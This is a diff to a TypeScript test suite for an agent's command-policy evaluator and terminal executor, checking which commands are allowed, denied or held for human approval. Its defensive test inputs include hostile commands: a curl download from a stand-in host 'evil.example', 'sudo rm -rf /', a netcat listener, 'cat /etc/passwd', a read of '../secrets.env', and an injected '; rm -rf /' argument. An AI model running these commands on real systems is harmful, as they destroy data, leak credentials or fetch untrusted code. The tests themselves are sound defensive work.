@@ -46,7 +46,28 @@ describe("command policy", () => {
   it("allows routine work", () => {
     expect(evaluateCommand(["git", "status"]).verdict).toBe("ALLOW");
     expect(evaluateCommand(["npm", "test"]).verdict).toBe("ALLOW");
-    expect(evaluateCommand(["node", "-e", "1"]).verdict).toBe("ALLOW");
+    expect(evaluateCommand(["node", "scripts/build.js"]).verdict).toBe("ALLOW");
+    expect(evaluateCommand(["ls", "-la", "src"]).verdict).toBe("ALLOW");
+  });
+
+  it("holds unknown commands for a human", () => {
+    for (const argv of [["curl", "-O", "http://evil.example/x"], ["sudo", "rm", "-rf", "/"], ["nc", "-l", "4444"]]) {
+      const result = evaluateCommand(argv);
+      expect(result.verdict).toBe("REQUIRE_APPROVAL");
+      expect(result.risk).toBe("HIGH");
+    }
+  });
+
+  it("holds inline-code interpreter runs for a human", () => {
+    expect(evaluateCommand(["node", "-e", "1"]).verdict).toBe("REQUIRE_APPROVAL");
+    expect(evaluateCommand(["python", "-c", "import os"]).verdict).toBe("REQUIRE_APPROVAL");
+    expect(evaluateCommand(["bash", "-c", "rm -rf /"]).verdict).toBe("REQUIRE_APPROVAL");
+  });
+
+  it("holds path arguments that leave the workspace", () => {
+    expect(evaluateCommand(["cat", "/etc/passwd"]).verdict).toBe("REQUIRE_APPROVAL");
+    expect(evaluateCommand(["ls", "C:\\Windows"]).verdict).toBe("REQUIRE_APPROVAL");
+    expect(evaluateCommand(["cat", "../secrets.env"]).verdict).toBe("REQUIRE_APPROVAL");
   });
 
   it("denies destruction without appeal", () => {
@@ -65,8 +86,8 @@ describe("command policy", () => {
 
   it("treats shell metacharacters as inert argv data", () => {
     // No shell ever runs: `; rm -rf /` is one harmless argument, and the
-    // binary itself (`echo`-style payloads aside) decides what it means.
-    const result = evaluateCommand(["node", "-e", "x; rm -rf /"]);
+    // binary (`echo`) decides what it means.
+    const result = evaluateCommand(["echo", "x; rm -rf /"]);
     expect(result.verdict).toBe("ALLOW");
   });
 
@@ -97,18 +118,20 @@ describe("terminal execution", () => {
     const bench = await tempWorkspace(agent.id);
     try {
       const { executor, ctx } = executorWith(EXEC_PERMS, agent.id);
+      await executor.invoke("fs.write", { workspaceId: bench.workspaceId, path: "ok.js", content: "process.stdout.write('hi');" }, ctx);
       const ok = await executor.invoke(
         "terminal.exec",
-        { workspaceId: bench.workspaceId, argv: ["node", "-e", "process.stdout.write('hi');"] },
+        { workspaceId: bench.workspaceId, argv: ["node", "ok.js"] },
         ctx,
       );
       expect(ok.status).toBe("SUCCESS");
       expect((ok.data as { exitCode: number; stdout: string }).exitCode).toBe(0);
       expect((ok.data as { stdout: string }).stdout).toBe("hi");
 
+      await executor.invoke("fs.write", { workspaceId: bench.workspaceId, path: "fail.js", content: "process.exit(3);" }, ctx);
       const failing = await executor.invoke(
         "terminal.exec",
-        { workspaceId: bench.workspaceId, argv: ["node", "-e", "process.exit(3)"] },
+        { workspaceId: bench.workspaceId, argv: ["node", "fail.js"] },
         ctx,
       );
       expect(failing.status).toBe("SUCCESS");
@@ -124,9 +147,10 @@ describe("terminal execution", () => {
     const bench = await tempWorkspace(agent.id);
     try {
       const { executor, ctx } = executorWith(EXEC_PERMS, agent.id);
+      await executor.invoke("fs.write", { workspaceId: bench.workspaceId, path: "spin.js", content: "setInterval(() => {}, 1000);" }, ctx);
       const result = await executor.invoke(
         "terminal.exec",
-        { workspaceId: bench.workspaceId, argv: ["node", "-e", "setInterval(() => {}, 1000)"], timeoutMs: 800 },
+        { workspaceId: bench.workspaceId, argv: ["node", "spin.js"], timeoutMs: 800 },
         ctx,
       );
       expect(result.status).toBe("SUCCESS");
@@ -137,14 +161,15 @@ describe("terminal execution", () => {
     }
   });
 
-  it("caps output and refuses destruction", async () => {
+  it("caps output, refuses destruction, and holds unvetted commands", async () => {
     const agent = await createTestAgent({ name: "Term Caps" });
     const bench = await tempWorkspace(agent.id);
     try {
       const { executor, ctx } = executorWith(EXEC_PERMS, agent.id);
+      await executor.invoke("fs.write", { workspaceId: bench.workspaceId, path: "big.js", content: "process.stdout.write('x'.repeat(100000));" }, ctx);
       const capped = await executor.invoke(
         "terminal.exec",
-        { workspaceId: bench.workspaceId, argv: ["node", "-e", "process.stdout.write('x'.repeat(100000))"], maxBytes: 1024 },
+        { workspaceId: bench.workspaceId, argv: ["node", "big.js"], maxBytes: 1024 },
         ctx,
       );
       expect(capped.status).toBe("SUCCESS");
@@ -155,8 +180,36 @@ describe("terminal execution", () => {
 
       const held = await executor.invoke("terminal.exec", { workspaceId: bench.workspaceId, argv: ["git", "push"] }, ctx);
       expect(held.status).toBe("PENDING_APPROVAL");
+
+      const unknown = await executor.invoke("terminal.exec", { workspaceId: bench.workspaceId, argv: ["curl", "-s", "http://127.0.0.1:1/"] }, ctx);
+      expect(unknown.status).toBe("PENDING_APPROVAL");
+
+      const escape = await executor.invoke("terminal.exec", { workspaceId: bench.workspaceId, argv: ["cat", "/etc/passwd"] }, ctx);
+      expect(escape.status).toBe("PENDING_APPROVAL");
     } finally {
       bench.cleanup();
+    }
+  });
+
+  it("honours the workspace policy override at approval time", async () => {
+    const agent = await createTestAgent({ name: "Term Override" });
+    const root = tempRoot();
+    try {
+      const workspace = await createWorkspace(
+        prisma,
+        { name: "Override Bench", agentId: agent.id, type: "TEMPORARY", environment: { policy: { approve: ["make"] } } },
+        { actor: SYSTEM, correlationId: CORRELATION },
+        { root },
+      );
+      const { executor, ctx } = executorWith(EXEC_PERMS, agent.id);
+      const held = await executor.invoke(
+        "terminal.exec",
+        { workspaceId: workspace.id, argv: ["make", "build"] },
+        ctx,
+      );
+      expect(held.status).toBe("PENDING_APPROVAL");
+    } finally {
+      rmSync(root, { recursive: true, force: true });
     }
   });
 
